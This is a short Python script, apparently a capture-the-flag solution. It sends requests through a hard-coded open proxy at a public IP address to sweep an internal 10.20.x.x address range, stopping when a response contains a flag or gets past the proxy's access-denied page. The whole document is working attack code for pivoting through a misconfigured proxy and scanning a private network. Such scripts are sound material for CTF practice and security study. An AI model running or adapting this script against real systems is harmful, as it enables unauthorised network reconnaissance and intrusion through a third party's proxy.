import requests, sys

proxy = {'http': 'http://78.128.216.8:3128' }

for i in range(32, 40):
    for j in range(1, 255):
        addr = 'http://10.20.%i.%i' % (i, j)
        print(addr)
        r = requests.get(addr, proxies=proxy)
        if 'FLAG' in r.text or 'ERR_ACCESS_DENIED' not in r.text:
            print(r.text)
            sys.exit(0)
            